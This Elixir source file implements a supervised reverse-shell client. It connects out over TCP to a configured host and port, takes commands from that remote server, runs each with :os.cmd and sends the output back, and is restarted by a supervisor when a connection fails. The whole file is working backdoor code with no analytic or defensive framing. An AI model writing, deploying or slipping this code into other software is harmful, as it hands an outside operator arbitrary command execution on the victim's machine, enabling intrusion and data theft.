defmodule Ers.Client do
  use Application

  @module __MODULE__

  def connect_opts, do: [:binary, active: false]
  def host,         do: Application.get_env(:ers_client, :host)
  def port,         do: Application.get_env(:ers_client, :port)
  def end_of_input, do: Application.get_env(:ers_client, :end_of_input) <> "\n"
  def timeout,      do: Application.get_env(:ers_client, :timeout) <> "\n"

  def start(_type, _args) do
    import Supervisor.Spec, warn: false

    children = [worker(Task, [@module, :connect, [port]])]

    opts = [strategy: :one_for_one, name: Ers.Client.Supervisor]
    Supervisor.start_link(children, opts)
  end

  def connect(port) do
    case :gen_tcp.connect(to_char_list(host), port, connect_opts) do
      {:ok, server} -> wait_for_input(server)
      _             -> sleep()
    end
  end

  def wait_for_input(server) do
    case :gen_tcp.recv(server, 0) do
      {:ok, cmd} -> process(server, cmd)
      _          -> sleep()
    end
  end

  def process(server, cmd) do
    case cmd do
      _ -> exec_cmd(server, to_char_list(cmd))
    end
  end

  def exec_cmd(server, cmd) do
    output = try do
               Task.async(fn -> :os.cmd(cmd) end)
               |> Task.await(5000)
             catch
               :exit, _ -> timeout
             end

    :ok = :gen_tcp.send(server, output)
    :ok = :gen_tcp.send(server, end_of_input)

    wait_for_input(server)
  end

  def sleep do
    :timer.sleep(5000)
  end
end
